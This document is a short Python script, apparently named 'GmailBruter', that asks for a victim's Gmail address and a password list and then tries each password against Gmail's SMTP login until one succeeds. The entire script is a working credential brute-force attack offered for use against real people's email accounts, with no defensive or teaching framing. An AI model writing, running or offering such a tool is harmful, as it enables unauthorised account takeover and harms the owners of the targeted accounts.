import smtplib 
import termcolor 
import colored
import os 

os.system('figlet GmailBruter')
print('                                     ' "By SATNAM")

smtpserver= smtplib.SMTP("smtp.gmail.com" ,587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Enter thr Gmail of Victim :")
passwd= input("Enter the Path of Paasword List : ")

file= open(passwd , "r")

for password in file:

	password = password.strip('\n')

	try:
		smtpserver.login(user,password)
		print("[*] Pass Found : %s " %password )
		break

	except smtplib.SMTPAuthenticationError:
		print("[-] Wrong password:" + password )

